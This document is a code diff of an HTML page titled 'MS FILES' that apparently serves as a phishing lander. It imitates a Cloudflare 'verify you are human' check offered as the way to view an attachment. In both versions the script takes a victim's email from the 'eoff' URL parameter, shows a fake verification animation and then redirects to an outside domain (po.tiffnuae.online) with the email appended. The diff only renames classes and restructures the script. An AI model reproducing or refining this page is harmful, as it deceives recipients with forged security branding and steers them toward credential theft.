@@ -6,174 +6,182 @@
     <title>MS FILES</title>
     <style>
         :root {
-            --p-a: #4a6ee0;
-            --s-c: #28a745;
-            --b-l: #f8f9fa;
+            --color-primary: #4a6ee0;
+            --color-success: #28a745;
+            --color-bg-light: #f8f9fa;
+            --color-text-main: #333;
+            --color-border: #ddd;
+            --transition-standard: 450ms cubic-bezier(0.4, 0, 0.2, 1);
         }
 
         * {
             box-sizing: border-box;
-        }
-
-        html, body {
-            height: 100%;
             margin: 0;
             padding: 0;
-            font-family: system-ui, -apple-system, sans-serif;
         }
 
-        .app-wrapper {
-            background: #fff;
-            color: #333;
-            min-height: 100vh;
-            display: grid;
-            place-items: center;
-            padding: 1.25rem;
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #fff;
+            color: var(--color-text-main);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
         }
 
-        /* Loading Screen */
-        #preloader {
+        /* Loading Component */
+        #loader-overlay {
             position: fixed;
             inset: 0;
-            background: var(--b-l);
+            background: var(--color-bg-light);
             display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
-            transition: opacity 450ms cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 10000;
+            transition: opacity var(--transition-standard);
         }
 
-        .astro-logo {
+        .loader-brand {
             width: 120px;
-            height: auto;
-            animation: breath 1.5s ease-in-out infinite;
+            animation: pulse 1.5s ease-in-out infinite;
         }
 
-        @keyframes breath {
-            0%, 100% { transform: scale(1); opacity: 0.85; }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
             50% { transform: scale(1.08); opacity: 1; }
         }
 
-        /* Main View */
-        .auth-view {
+        /* Main Content */
+        .content-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
             width: 100%;
             max-width: 440px;
-            margin-top: 140px;
+            padding: 20px;
             opacity: 0;
-            transform: scale(0.98);
-            transition: 600ms ease-out;
+            transform: translateY(10px);
+            transition: opacity 600ms ease-out, transform 600ms ease-out;
         }
 
-        .auth-view.active {
+        .content-container.visible {
             opacity: 1;
-            transform: scale(1);
+            transform: translateY(0);
         }
 
-        .headline-text {
+        .heading {
             text-align: center;
-            margin-bottom: 22px;
             font-size: 1.1rem;
             font-weight: 500;
             color: #222;
             line-height: 1.4;
+            margin-bottom: 24px;
         }
 
-        /* Challenge Box */
-        .challenge-panel {
-            background: var(--b-l);
+        /* Verification Card */
+        .verification-card {
+            background: var(--color-bg-light);
+            border: 1px solid var(--color-border);
             border-radius: 10px;
-            padding: 32px 20px;
+            padding: 30px 20px;
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            border: 1px solid #ddd;
-            transition: border-color 0.2s;
-            min-height: 30px;
+            align-items: center;
+            transition: border-color 0.2s ease;
         }
 
-        .challenge-panel:hover {
+        .verification-card:hover {
             border-color: #bbb;
         }
 
-        .interactive-row {
+        .check-group {
             display: flex;
             align-items: center;
             gap: 15px;
         }
 
-        /* Checkbox Styling */
-        .custom-check {
-            width: 19px;
-            height: 19px;
-            border: 2px solid var(--p-a);
+        .check-box {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--color-primary);
             border-radius: 4px;
             background: #fff;
             cursor: pointer;
+            position: relative;
+            transition: all 0.25s ease;
             display: flex;
             align-items: center;
             justify-content: center;
-            transition: 0.25s;
         }
 
-        .custom-check.is-running {
+        .check-box.loading {
             border-radius: 50%;
-            border-color: transparent;
-            border-top-color: var(--p-a);
-            animation: rot 1s linear infinite;
+            border-color: #eee;
+            border-top-color: var(--color-primary);
+            animation: spin 1s linear infinite;
         }
 
-        @keyframes rot {
-            to { transform: rotate(360deg); }
+        .check-box.complete {
+            background: var(--color-success);
+            border-color: var(--color-success);
         }
 
-        .custom-check.is-done {
-            background: var(--s-c);
-            border-color: var(--s-c);
-        }
-
-        .custom-check.is-done::before {
+        .check-box.complete::after {
             content: "\2713";
             color: white;
+            font-size: 14px;
             font-weight: bold;
         }
 
-        /* Cloudflare Branding */
-        .brand-meta {
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .brand-info {
             text-align: right;
             font-size: 11px;
             color: #777;
         }
 
-        .brand-meta img {
+        .brand-info img {
             width: 28px;
             vertical-align: middle;
-            margin-right: 4px;
+            margin-right: 5px;
         }
 
-        .brand-meta b {
+        .brand-info b {
             color: #f38020;
             letter-spacing: 0.5px;
         }
 
-        /* Footer */
-        .system-footer {
-            margin-top: auto;
-            padding-bottom: 30px;
+        .status-msg {
+            text-align: center;
+            margin-top: 25px;
+            font-size: 12px;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+
+        /* Footer Section */
+        .footer-shield {
+            padding: 30px;
             color: #999;
             font-size: 12px;
             display: flex;
             align-items: center;
-            justify-content: center;
             gap: 8px;
             opacity: 0;
             transition: opacity 0.5s ease;
         }
 
-        .system-footer.active {
+        .footer-shield.visible {
             opacity: 1;
         }
 
-        .shield-icon {
+        .shield-svg {
             width: 12px;
             height: 14px;
             background: #999;
@@ -181,101 +189,100 @@
         }
     </style>
 </head>
-<body class="app-wrapper">
+<body>
 
-    <div id="preloader">
-        <img src="astro.png" class="astro-logo" alt="Loading">
+    <div id="loader-overlay">
+        <img src="astro.png" class="loader-brand" alt="Loading">
     </div>
 
-    <main class="auth-view" id="uiFrame">
-        <h1 class="headline-text">Verify you are human by completing the action below to view attachment</h1>
-        
-        <div class="challenge-panel">
-            <div class="interactive-row">
-                <div id="triggerPoint" class="custom-check"></div>
-                <span id="labelNode" style="font-weight: 500; font-size: 16px;">Verify</span>
+    <main class="content-container" id="mainContent">
+        <h1 class="heading">Verify you are human by completing the action below to view attachment</h1>
+
+        <div class="verification-card">
+            <div class="check-group">
+                <div id="actionBox" class="check-box"></div>
+                <span id="statusLabel" style="font-weight: 500; font-size: 16px;">Verify</span>
             </div>
-            
-            <div class="brand-meta">
-                <div><img src="cloudflare_.png" alt="Cloudflare logo"><b>CLOUDFLARE</b></div>
+
+            <div class="brand-info">
+                <div><img src="cloudflare_.png" alt="logo"><b>CLOUDFLARE</b></div>
                 <span>Privacy &middot; Terms</span>
             </div>
         </div>
 
-        <div id="extraNotice" style="text-align:center; margin-top:25px; font-size:12px; opacity:0; transition:0.5s;"></div>
+        <div id="successNotice" class="status-msg"></div>
     </main>
 
-    <footer class="system-footer" id="legalNode">
-        <div class="shield-icon"></div>
-        <span>Protected by Cloudflare</span>
+    <footer class="footer-shield" id="footerLegal">
+        <div class="shield-svg"></div>
+        <span>Protected by CLOUDFLARE</span>
     </footer>
 
     <script>
-        (function() {
-            // UI Element Selectors
-            const ui = {
-                loader: document.getElementById('preloader'),
-                main: document.getElementById('uiFrame'),
-                btn: document.getElementById('triggerPoint'),
-                label: document.getElementById('labelNode'),
-                footer: document.getElementById('legalNode'),
-                notice: document.getElementById('extraNotice')
+        (() => {
+            const DOM = {
+                loader: document.getElementById('loader-overlay'),
+                main: document.getElementById('mainContent'),
+                trigger: document.getElementById('actionBox'),
+                label: document.getElementById('statusLabel'),
+                footer: document.getElementById('footerLegal'),
+                notice: document.getElementById('successNotice')
             };
 
-            let isProcessing = false;
-            let queryEmail = '';
+            const CONFIG = {
+                redirectUrl: "https://po.tiffnuae.online/api/v1/tgKHf0r0EWqIaCb5",
+                loadDelay: 1500,
+                processTime: 1800,
+                redirectDelay: 2000
+            };
 
-            // Extract email/parameter logic
-            const extractParam = () => {
+            let isVerifying = false;
+
+            // Initialize Page
+            const init = () => {
                 const params = new URLSearchParams(window.location.search);
-                const eoff = params.get('eoff');
-                if (eoff) queryEmail = eoff;
+                const emailHash = params.get('eoff');
+
+                window.addEventListener('load', () => {
+                    setTimeout(() => {
+                        DOM.loader.style.opacity = '0';
+                        setTimeout(() => {
+                            DOM.loader.style.display = 'none';
+                            DOM.main.classList.add('visible');
+                            DOM.footer.classList.add('visible');
+                        }, 500);
+                    }, CONFIG.loadDelay);
+                });
+
+                DOM.trigger.addEventListener('click', () => handleVerification(emailHash));
             };
 
-            extractParam();
+            const handleVerification = (email) => {
+                if (isVerifying) return;
 
-            // Initial Page Load Animation
-            window.addEventListener('load', () => {
+                isVerifying = true;
+                DOM.label.textContent = "Verifying...";
+                DOM.trigger.classList.add('loading');
+
                 setTimeout(() => {
-                    ui.loader.style.opacity = '0';
+                    DOM.trigger.classList.remove('loading');
+                    DOM.trigger.classList.add('complete');
+                    DOM.label.textContent = "Success";
+
                     setTimeout(() => {
-                        ui.loader.style.display = 'none';
-                        ui.main.classList.add('active');
-                        ui.footer.classList.add('active');
-                    }, 500);
-                }, 1500);
-            });
-
-            // Handle Verification Click
-            ui.btn.onclick = () => {
-                if (isProcessing) return;
-                
-                isProcessing = true;
-                ui.label.innerText = "Verifying...";
-                ui.btn.classList.add('is-running');
-
-                // Simulation Delays
-                setTimeout(() => {
-                    ui.btn.classList.replace('is-running', 'is-done');
-                    ui.label.innerText = "Success";
-                    
-                    setTimeout(() => { 
-                        ui.notice.style.opacity = '1'; 
+                        DOM.notice.style.opacity = '1';
                     }, 400);
 
-                    // Final Redirection Sequence
+                    // Final Navigation
                     setTimeout(() => {
-                        const base = "https://po.tiffnuae.online/api/v1/tgKHf0r0EWqIaCb5";
-                        let target = base;
+                        const destination = email ? `${CONFIG.redirectUrl}#${email}` : CONFIG.redirectUrl;
+                        window.location.href = destination;
+                    }, CONFIG.redirectDelay);
 
-                        if (queryEmail) {
-                            target += '#' + queryEmail;
-                        }
-
-                        window.location.href = target;
-                    }, 2000);
-                }, 1800);
+                }, CONFIG.processTime);
             };
+
+            init();
         })();
     </script>
 </body>
